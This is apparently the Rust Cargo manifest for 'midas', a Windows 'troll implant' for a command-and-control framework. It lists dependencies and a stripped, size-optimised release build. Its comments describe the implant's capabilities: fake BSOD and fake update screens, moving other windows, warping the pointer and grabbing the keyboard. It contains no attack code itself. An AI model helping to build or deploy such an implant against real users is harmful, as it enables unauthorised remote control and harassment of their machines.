[package]
name = "midas"
version = "0.1.0"
edition = "2021"
build = "build.rs"
description = "Midas - Windows troll implant for the Altin C2"
publish = false

[dependencies]
serde = { version = "1", features = ["derive"] }
serde_json = "1"
local-ip-address = "0.6"
ureq = "2.10"

# Overlays are drawn with egui because they have to be faked from scratch anyway
# (fake BSOD, fake update, glitch static). A real MessageBoxW is used instead -
# see gui/win.rs. Only the glow renderer is pulled in, since there is no longer
# a non-Windows windowing backend to support.
eframe = { version = "0.29", default-features = false, features = [
    "default_fonts",
    "glow",
] }
egui = "0.29"
image = { version = "0.25", default-features = false, features = [
    "png",
    "jpeg",
    "gif",
    "bmp",
] }

# Windows only. The X11 backend was removed because a Wayland compositor forbids
# the cross-client operations this implant is built around - moving another
# application's window, warping the pointer, grabbing the keyboard - so most of
# the command surface could not have worked there. main.rs rejects other targets
# with an explanation rather than compiling a half-working implant.

[profile.release]
opt-level = "z"
lto = true
codegen-units = 1
strip = true
